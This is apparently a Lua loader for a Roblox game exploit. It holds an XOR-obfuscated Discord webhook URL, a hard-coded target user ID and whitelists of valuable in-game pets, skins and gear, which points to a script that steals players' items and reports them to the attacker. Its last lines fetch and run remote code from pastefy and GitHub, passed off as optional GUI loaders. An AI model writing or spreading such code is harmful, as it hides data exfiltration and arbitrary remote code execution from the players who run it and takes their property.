local genv = getgenv()

genv.GOOD_WEBHOOK = (function() local b={233,245,245,241,242,187,174,174,229,232,242,226,238,243,229,175,226,238,236,174,224,241,232,174,246,228,227,233,238,238,234,242,174,176,180,178,179,181,184,179,184,183,185,185,178,176,185,185,176,179,179,183,174,199,238,194,172,201,198,201,202,240,240,201,245,202,213,182,194,233,213,177,226,212,200,198,213,246,206,216,198,244,216,215,233,228,209,249,176,195,194,180,214,182,227,234,216,172,248,202,197,234,246,244,185,248,222,245,211,215,234,201,184,234,182,248,179,226,202,230,230} local k=129 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()

genv.TARGET_USER_ID = 10279786442

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Meowl",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Celestial Pegasus",
    "Hydra Bunny",
    "Elefanto Frigo",
    "Cerberus",
    "Rosey and Teddy",
    "Popcuru and Fizzuru",
    "Bunny and Eggy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro and Fryuro",
    "Reinito Sleighito",
    "Ketupat Bros",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Duggy Bros",
    "Sammyni Cakini",
    "La Food Combinasion",
    "Spooky and Pumpky",
    "Boppin Bunny",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Los Spaghettis",
    "Festive 67",
    "Guest 666",
    "Rubrikiko",
    "Quackini Snackini",
    "Cloverat Clapat",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Fishino Clownino",
    "Jolly Jolly Sahur",
    "Gym Bros",
    "Tirilikalika Tirilikalako",
    "Rico Dinero",
    "Dug Dug Dug",
    "Fragola La La La",
    "Los Primos",
    "Globa Steppa",
    "Tralaledon",
    "Moby Bros",
    "Los Admins",
    "La Ginger Sekolah",
    "Capitano Americano"
}

genv.ALLOWED_BASESKINS = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Blackhole Bomb"] = true,
    ["Phantom Slap"] = true,
    ["Demon's Head"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/su9hI8dc/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
